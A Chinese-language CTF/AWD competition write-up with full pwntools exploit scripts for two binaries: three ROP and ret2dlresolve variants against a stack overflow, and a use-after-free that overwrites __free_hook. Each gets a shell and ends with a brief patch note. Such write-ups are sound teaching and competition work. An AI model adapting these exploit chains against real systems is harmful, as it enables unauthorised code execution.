


欢迎爱好安全的小伙伴加入星盟。

# 星盟周年庆 awd 比赛 pwn 解

## ret2dl

标准的栈溢出，没有泄露点。

```
vuln proc near

buf= byte ptr -20h

  push    rbp
  mov     rbp, rsp
  sub     rsp, 20h
  mov     rax, cs:stdin@@GLIBC_2_2_5
  lea     rdx, [rbp+buf]
  mov     rsi, rdx      ; buf
  mov     rdi, rax      ; stream
  call    _setbuf
  lea     rax, [rbp+buf]
  mov     edx, 100h     ; nbytes
  mov     rsi, rax      ; buf
  mov     edi, 0        ; fd
  call    _read
  nop
  leave
  retn
vuln endp
```

总共有三种解法。

### 最快解法

直接用 gadget 来偏移got地址。

```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *0x4005dd
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

layout = [
    0x000000000040069a, # : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    (libc.symbols['system'] - libc.symbols['setbuf'] + 0x100000000), (elf.got['setbuf'] + 0x3d),
    0,0,0,0,

    0x0000000000400588, # : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

    0x00000000004006a3, # : pop rdi ; ret
    0,
    0x00000000004006a1, # : pop rsi ; pop r15 ; ret
    elf.bss(),
    0,

    elf.plt['read'],

    0x00000000004006a3, # : pop rdi ; ret
    elf.bss(),
    
    0x000000000040048e, # : ret
    elf.plt['setbuf'],
]

# pause()
sh.send('a' * 0x28 + flat(layout))
time.sleep(0.1)
sh.send('/bin/sh\0')

sh.interactive()
clear()
```

### 标准ret2dl解法

```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('pwn.buuoj.cn', 20035)
elf = ELF(execve_file)
# libc = ELF('./libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b _dl_fixup
    c
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

rela_plt = 0x000000000400448
dynsym_addr = 0x0000000004002c0
fake_rel_addr = 0x601808

layout = [
    0x00000000004006a3, # : pop rdi ; ret
    0,
    0x00000000004006a1, # : pop rsi ; pop r15 ; ret
    elf.got['setbuf'] + 0x68, 
    0,

    elf.plt['read'],

    
    0x00000000004006a3, # : pop rdi ; ret
    elf.got['setbuf'] + 0x120, # /bin/sh

    0x000000000040048e, # : ret

    0x400496, # dl_resolve
    elf.got['setbuf'], # link_map
    0, # rel_offset
    0,
]

# pause()
sh.send('a' * 0x28 + flat(layout))

layout = [
    elf.got['setbuf'] + 0x68, elf.got['setbuf'] + 0x70, elf.got['setbuf'] + 0x80,
    (p32(0), p8(0), p8(1), p16(0), (libc.symbols['system'] - libc.symbols['setbuf'] + 0x10 ** 16), 0), # Elf64_Sym

    '\0' * (0xf8 - 0x98),

    elf.got['setbuf'] + 0xf8, elf.got['setbuf'] + 0x108,

    (libc.bss() - libc.symbols['setbuf']), 0x7, 0, # Elf64_Rela
    '/bin/sh\0',
]

time.sleep(0.1)
sh.send(flat(layout))

sh.interactive()
clear()
```

### 偏门ret2dl

设置 `Elf64_Sym->st_info` 值为10，直接 call 计算出来的函数，但是 rdi 可能会根据不同的 libc 版本而变化，所以这种方法适合`onegadget`。

```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b _dl_fixup
    c
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

rela_plt = 0x000000000400448
dynsym_addr = 0x0000000004002c0
fake_rel_addr = 0x601808

layout = [
    0x00000000004006a3, # : pop rdi ; ret
    0,
    0x00000000004006a1, # : pop rsi ; pop r15 ; ret
    elf.got['setbuf'] + 0x68, 
    0,

    elf.plt['read'],

    0x400496, # dl_resolve
    elf.got['setbuf'], # link_map
    0, # rel_offset
    0,
]

# pause()
sh.send('a' * 0x28 + flat(layout))

layout = [
    elf.got['setbuf'] + 0x90, elf.got['setbuf'] + 0x70, elf.got['setbuf'] + 0x80,
    (p32(0), p8(10), p8(1), p16(0), (libc.symbols['system'] - libc.symbols['setbuf'] + 0x10 ** 16), 0), # Elf64_Sym

    elf.got['setbuf'] + 0xa0, u64('/bin/sh\0'),

    '\0' * (0xf8 - 0xa8),

    elf.got['setbuf'] + 0xf8, elf.got['setbuf'] + 0x108,

    0, 0x7, 0, # Elf64_Rela
]

time.sleep(0.1)
sh.send(flat(layout))

sh.interactive()
clear()
```

### 修复

直接将 0x100 patch 成 0x20 即可。

## heap

没有清理指针：

```
loc_14DC:
  mov     eax, [rbp+var_C]
  cdqe
  lea     rdx, ds:0[rax*8]
  lea     rax, unk_4060
  mov     rax, [rdx+rax]
  mov     rdi, rax      ; ptr
  call    _free
  lea     rdi, aDone    ; "Done!"
  call    _puts
```

常规的做法，泄露地址，劫持hook。

```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn2'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *0x4005dd
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('>>', '1')
    sh.sendlineafter(':', str(size))
    sh.sendafter(':', content)

def delete(index):
    sh.sendlineafter('>>', '2')
    sh.sendlineafter(':', str(index))

def show(index):
    sh.sendlineafter('>>', '3')
    sh.sendlineafter(':', str(index))

add(0x500, '\n')
add(1, '\n')
delete(0)
show(0)

result = sh.recvuntil('\n', drop=True)

if(result == 'invalid'):
    raise Exception("fixed")

libc_addr = u64(result.ljust(8, '\0')) - 0x3ebca0
log.success('libc_addr: ' + hex(libc_addr))

delete(1)
delete(1)

add(8, p64(libc_addr + libc.symbols['__free_hook']))
add(8, '/bin/sh\0')
add(8, p64(libc_addr + libc.symbols['system']))

delete(3)

sh.interactive()
clear()
```

### 修复

可以直接写个hook函数来清理指针。
